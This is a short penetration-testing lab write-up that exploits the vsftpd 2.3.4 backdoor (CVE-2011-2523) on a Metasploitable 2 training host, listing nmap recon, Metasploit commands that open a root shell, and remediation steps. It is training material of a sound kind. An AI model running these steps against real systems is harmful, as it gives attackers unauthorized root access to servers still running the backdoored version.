# Exercise 1: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

## Date
2026-11-16

## Target
- Host: 10.10.20.10 (Metasploitable 2, lab-victim)
- Service: vsftpd 2.3.4 on TCP/21
- Attacker: 10.10.20.50 (Kali, lab-victim)

## Vulnerability
vsftpd 2.3.4 contains a backdoor introduced into the source code by attackers
in 2011. A special smiley-face in the username (`:)`) opens a root shell on
port 6200.

Reference: CVE-2011-2523

## Recon
- nmap -sV 10.10.20.10
- Identified: 21/tcp open ftp vsftpd 2.3.4

## Exploitation
1. msfconsole -q
2. search vsftpd → exploit/unix/ftp/vsftpd_234_backdoor
3. set RHOSTS 10.10.20.10
4. exploit → root shell

## Result
- Session 1 opened as root
- Confirmed: id → uid=0(root) gid=0(root)

## Remediation
- Upgrade vsftpd to a supported version
- Verify package integrity (sha256sum against upstream)
- Restrict FTP exposure to internal networks only
- Prefer SFTP over FTP

## Lessons
- Backdoored supply chains exist in production software
- Version enumeration is critical
- Metasploit modules make exploitation reproducible
